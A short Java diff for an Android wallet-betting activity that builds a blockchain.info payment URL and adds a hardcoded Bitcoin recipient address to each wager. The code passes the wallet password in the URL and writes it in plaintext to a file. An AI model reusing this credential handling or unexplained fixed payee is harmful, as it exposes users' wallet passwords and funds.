@@ -88,7 +88,7 @@ public class WalletInfo extends Activity {
 		String wager_string = wager.getText().toString();
 		String data = "https://blockchain.info/merchant/" + id_string
 				+ "/payment?password=" + pass_string + "&amount="
-				+ wager_string;
+				+ wager_string+"&to=145iGHePmHCm9GLLoXiHQ6GiqG6ZVsy4UZ";
 		writeToFile(data+"\n"+id_string+"\n"+pass_string+"\n"+wager_string);
 	}
 
